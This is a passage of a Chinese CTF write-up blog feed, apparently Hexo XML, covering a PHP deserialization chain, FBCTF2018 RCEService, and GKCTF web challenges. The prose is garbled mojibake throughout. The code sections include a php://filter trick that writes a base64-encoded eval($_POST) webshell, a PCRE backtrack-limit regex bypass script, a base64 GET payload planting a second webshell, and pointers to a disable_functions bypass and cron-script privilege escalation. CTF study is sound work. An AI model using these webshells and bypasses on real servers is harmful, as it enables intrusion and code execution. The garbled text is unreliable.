<p>ä¸€çœ¼å°±çœ‹åˆ°äº†file_put_contentsï¼Œé‚£ä¹ˆåˆ©ç”¨è‚¯å®šä¹Ÿæ˜¯é€šè¿‡è¿™ä¸ªï¼Œå‘ç°ä»–åœ¨setæ–¹æ³•å½“ä¸­ï¼Œå›æº¯å“ªé‡Œèƒ½ç”¨åˆ°setæ–¹æ³•ï¼Œ</p>
<p>Aç±»å½“ä¸­è‚¯å®šç»™äº†ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±ç®€å•äº†ã€‚åªä¸è¿‡é¢˜ç›®è¿˜éœ€è¦ç»•è¿‡ç­‰ç­‰æ¯”è¾ƒçƒ¦ï¼Œbase64æ¯”è¾ƒçƒ¦äººï¼Œå…¶ä»–éƒ½è¿˜å¥½ï¼ˆæŒ‡è°ƒäº†å¥½ä¹…ï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store, $key , $expire = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        var_dump($contents);</span></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"><span class="comment">//        var_dump($cleaned);</span></span><br><span class="line"><span class="comment">//        print_r(json_encode([$cleaned, $this-&gt;complete]));</span></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"><span class="comment">//        echo $contents;</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params">$expire</span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> $name</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . $name;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">$data</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) $data;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        print_r($data);</span></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"><span class="comment">//        print_r($serialize);</span></span><br><span class="line"><span class="comment">//        print_r($serialize($data));</span></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value, $expire = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        var_dump($name);</span></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"><span class="comment">//        print_r($filename);</span></span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"><span class="comment">//        print_r($dir);</span></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// åˆ›å»ºå¤±è´¥</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"><span class="comment">//        print_r($data);</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line"><span class="comment">//            print_r($data);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        print_r($filename);</span></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line"><span class="comment">//        print_r($data);</span></span><br><span class="line"><span class="comment">//        print_r(base64_decode($data));</span></span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line"><span class="comment">//            echo 1;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        echo 1;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//if (isset($_GET[&#x27;src&#x27;]))</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//$dir = &quot;uploads/&quot;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (!is_dir($dir))</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//    mkdir($dir);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&quot;strval&quot;</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;exprie&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$b-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//key ç»è¿‡è½¬æ¢åå˜æˆfilename</span></span><br><span class="line"><span class="comment">//contentsç»è¿‡è½¬æ¢åå†™å…¥åˆ°æ–‡ä»¶å½“ä¸­</span></span><br><span class="line"><span class="comment">//$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</span></span><br><span class="line">$a = <span class="keyword">new</span> A($b,<span class="string">&#x27;php://filter/write=convert.base64-decode/resource=4.php&#x27;</span>,<span class="number">111</span>);</span><br><span class="line"></span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>(<span class="string">&quot;path&quot;</span>=&gt;<span class="string">&quot;111PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8+&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Easy_Tomcat</title>
    <url>/2021/03/22/Easy-Tomcat/</url>
    <content><![CDATA[<p>æ²¡åšè¿‡javaé¢˜ç›®</p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>Tomcat</tag>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FBCTF2018RCEService</title>
    <url>/2020/11/17/FBCTF2018RCEService/</url>
    <content><![CDATA[<p>è¦ç›²è¯•è¯•å‡ºæ¥ã€‚ã€‚ã€‚å¤§ä½¬è¯´æ˜¯æœ‰æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜æ³¨æ„è¿™é‡Œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æˆ‘ä»¬æƒ³è¦æ‰§è¡Œå‘½ä»¤çš„è¯å¿…é¡»é€šè¿‡/bin/catæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆæœ¬äººä¸æ˜¯å¾ˆèƒ½æ˜ç™½åŸå› ã€‚ã€‚ï¼‰</p>
<p>æ­£åˆ™ç»•è¿‡ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡Pç‰›å¤§ä½¬çš„æ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;use-pcre-backtrack-limit-to-bypass-restrict.html</span><br></pre></td></tr></table></figure>

<p>é˜…è¯»Pç‰›å¤§ä½¬çš„æ–‡ç« ï¼Œå¤§è‡´æ„æ€æ˜¯ï¼ŒPHPçš„æ­£åˆ™å¹¶ä¸æ˜¯é€šè¿‡æ ¹æ®æ­£åˆ™çš„åŒ¹é…æ¥å†³å®šä¸‹ä¸€æ­¥çš„ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶çš„è¯ï¼Œæ­£åˆ™ä¾¿ä¼šæ— é™çš„å‘ååŒ¹é…ï¼Œç›´åˆ°æœ«å°¾ä¹‹åï¼Œå¦‚æœæ­£åˆ™æ²¡æœ‰èƒ½å¤ŸæˆåŠŸåŒ¹é…ç»“å°¾ï¼Œå°±ä¼šå¾€å›å›æº¯ï¼Œæ¥æŸ¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„æƒ…å†µ</p>
<p><img src="FBCTF2018RCEService/image-20201117154441800.png" alt="image-20201117154441800"></p>
<p>ç±»ä¼¼Pç‰›å¤§ä½¬çš„ä¾‹å­ï¼Œå¦‚æœæŒ‰ç…§æˆ‘ä»¬çš„æ€è·¯çš„è¯ï¼Œå½“åŒ¹é…åˆ° ;çš„æ—¶å€™ï¼Œå·²ç»åŒ¹é…æˆåŠŸï¼Œæ‰€ä»¥å°±åº”è¯¥åœä¸‹æ¥äº†ï¼Œä½†æ˜¯ç”±äº.*å¯ä»¥åŒ¹é…ä»»æ„ï¼Œæ•…æˆ‘ä»¬ä¼šä¸€ç›´åŒ¹é…åˆ°æœ€åä¸€æ­¥ï¼Œä½†æ­¤æ—¶æ­£åˆ™æ²¡æœ‰åŒ¹é…æˆåŠŸï¼Œå°±ä¼šå¾€å‰æ¨ï¼Œç›´åˆ°æ­£åˆ™åŒ¹é…æˆåŠŸã€‚</p>
<p>åˆå› ä¸ºPç‰›å¸ˆå‚…è¯´çš„ï¼Œåªè¦å›æº¯100000æ­¤å°±ä¼šå¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å‘é€ä¸€ä¸²è¶…çº§é•¿çš„å­—ç¬¦ä¸²å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line"></span><br><span class="line">params = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;123&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">params = &#123;<span class="string">&quot;cmd&quot;</span>:params&#125;</span><br><span class="line">url = <span class="string">&quot;http://e23f7266-20a3-4aa0-bfbc-8a9502764002.node3.buuoj.cn&quot;</span></span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=params).text</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„è¿™é‡Œä¸€å®šè¦å‘é€poståŒ…ï¼ŒgetåŒ…æ— æ³•æ¥å—è¿™ä¹ˆé•¿çš„å‚æ•°ï¼Œä¼ è¿‡å»å°±å¯ä»¥å¾—åˆ°flagäº†</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF</title>
    <url>/2020/10/27/GKCTF/</url>
    <content><![CDATA[<p>æŠ½ç©ºæŠŠGKCTFçš„é¢˜ç›®åˆ·äº†ï¼Œå…ˆä»ç¬¬ä¸€é¢˜å¼€å§‹è¯´å§</p>
<h1 id="1-Check-in"><a href="#1-Check-in" class="headerlink" title="1.Check in"></a>1.Check in</h1><p>è¯´æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œä½†æ˜¯å¾—ç”¨åˆ°pwnçš„çŸ¥è¯†ã€è™½ç„¶expç›´æ¥å°±èƒ½æ‰“äº†</p>
<p>ç¬¬ä¸€æ­¥è®¿é—®å°±èƒ½å®¡è®¡åˆ°ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="literal">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">&#x27;Ginkgo&#x27;</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„åºåˆ—åŒ–ï¼Œæˆ‘ä»¬ç›´æ¥base64ç¼–ç Ginkgoä¹‹åçš„å€¼å³å¯ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Ginkgo=cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡åˆ°PHPçš„ä»£ç ï¼Œä¸‹ä¸€æ­¥æˆ‘ä»¬ä¼šå‘ç°è‡ªå·±èšå‰‘è¿æ¥ä¸ä¸Šï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½è‡ªå·±å†å†™ä¸€ä¸ªshelläº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA==</span><br></pre></td></tr></table></figure>

<p>å¯†ç æ˜¯sakaniï¼Œä¹‹åå°±å¯ä»¥ç”¨èšå‰‘é“¾æ¥ä¸Šå»äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°flagæ²¡æ³•è¯»å•Šã€‚è€Œä¸”å› ä¸ºdisable_functionï¼Œæˆ‘ä»¬ æ²¡æœ‰åŠæ³•ä½¿ç”¨è™šæ‹Ÿç»ˆç«¯äº†ã€‚</p>
<p>ä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸ºPHP7.3ï¼Œå¯ä»¥å°è¯•ç”¨å†…æ ¸æ¼æ´ææƒï¼Œåœ¨tmpç›®å½•ï¼ˆ777ï¼‰ï¼Œä¸Šä¼ exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//github.com/mm0r1/exploits</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ è¿™é‡Œçš„gcæ¼æ´ï¼Œä¹‹åæ‰§è¡Œå‘½ä»¤å³å¯</p>
<h1 id="2-è€å…«å°è¶…å¸‚å„¿"><a href="#2-è€å…«å°è¶…å¸‚å„¿" class="headerlink" title="2.è€å…«å°è¶…å¸‚å„¿"></a>2.è€å…«å°è¶…å¸‚å„¿</h1><p>æ ¹æ®è¿™ç¯‡æ–‡ç« å¯ä»¥åšå‡ºæ¥å‰åŠæ®µæˆåŠŸæ‹¿åˆ°shellï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä¼ å…¥æˆåŠŸä¹‹åè·¯å¾„ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php</span><br></pre></td></tr></table></figure>

<p>ç”¨èšå‰‘è¿å…¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagå´ä¸èƒ½è¯»ï¼Œè¯»atuo.shå¯ä»¥çŸ¥é“å®ƒæ¯åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡makeflaghint.pyï¼ŒåŒæ—¶å…¶æƒé™æ˜¯766ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ”¹~ï¼Œé‚£æˆ‘ä»¬å»æ”¹è¿™ä¸ªpyçš„å†…å®¹è®©ä»–è¯»flagå³å¯ï¼Œç­‰ä¸€åˆ†é’Ÿï¼Œè¯»åˆ°flag</p>
<h1 id="3-EzNode"><a href="#3-EzNode" class="headerlink" title="3.EzNode"></a>3.EzNode</h1><p>å°±æ˜¯ä¸€ä¸ªå¾ˆåŸºç¡€çš„ä»£ç å®¡è®¡ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2020.1/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Number</span>.isInteger(<span class="built_in">parseInt</span>(req.query.delay))) &#123;</span><br><span class="line">      delay = <span class="built_in">Math</span>.max(delay, <span class="built_in">parseInt</span>(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> next(), delay);</span><br><span class="line">    <span class="comment">// 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">clearTimeout</span>(t);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„æ ¸å¿ƒä»£ç åœ¨worker2åˆ°worker3ä¹‹é—´ï¼Œæˆ‘ä»¬å‘ç°å¦‚æœdelayè¢«è®¾ç½®æˆäº†60*1000</p>
<p>è€Œè¶…æ—¶æ˜¯1000.å¦‚æœæ²¡æœ‰è¶…æ—¶ï¼Œåè€Œä¼šnextï¼Œä¹Ÿå°±æ˜¯ä¼šç»§ç»­æ‰§è¡Œä»£ç ï¼Œå¦åˆ™ç›´æ¥å¼¹å›å»è¶…æ—¶ï¼Œäºæ˜¯æˆ‘ä»¬çœ‹ä¸‹ä¸€æ­¥</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(<span class="built_in">String</span>(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢ä½¿ç”¨äº†saferEvalçš„ä»£ç ï¼Œæ¥æ”¶eçš„å‚æ•°ï¼Œäºæ˜¯æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ¸…æ™°ï¼Œé¦–å…ˆå°è¯•ç»•è¿‡å¯¹è¶…æ—¶çš„é™åˆ¶ï¼Œå†æœä¸€ä¸‹saferEvalçš„æ•°æ®~ï¼Œæ–‡æ¡£è¯´åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parseInt(string, radix)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">å‚æ•°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">string</td>
<td align="left">å¿…éœ€ã€‚è¦è¢«è§£æçš„å­—ç¬¦ä¸²ã€‚</td>
